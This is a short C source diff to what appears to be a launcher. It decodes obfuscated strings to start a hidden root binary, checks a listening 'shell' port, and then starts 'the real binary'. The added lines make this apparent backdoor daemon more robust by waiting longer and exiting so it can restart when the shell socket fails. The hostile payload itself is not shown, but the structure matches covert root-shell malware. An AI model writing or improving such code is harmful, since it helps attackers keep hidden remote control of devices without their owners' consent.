@@ -2,11 +2,13 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <sys/stat.h>
+
 #include "shell_params.h"
 #include "deobfuscate.h"
 #include "ps.h"
 #include "runner_bin.h"
 #include "log.h"
+#include "utils.h"
 
 int check_runner_id(void) {
   FILE *f;
@@ -56,7 +58,11 @@ int main(int argc, char **argv) {
   if(fork() == 0)
     execl(deobfuscate(ROOT_BIN), deobfuscate(ROOT_BIN_ARG0), deobfuscate(OPT), NULL);
 
-  sleep(2);
+  sleep(5);
+  if(check_socket(SHELL_PORT) != 0) {
+    LOGD("Socket error\n");
+    exit(0); // If a file descriptor error occurs we have to restart the daemon process
+  }
 
   // Start the real binary
   if(fork() == 0)
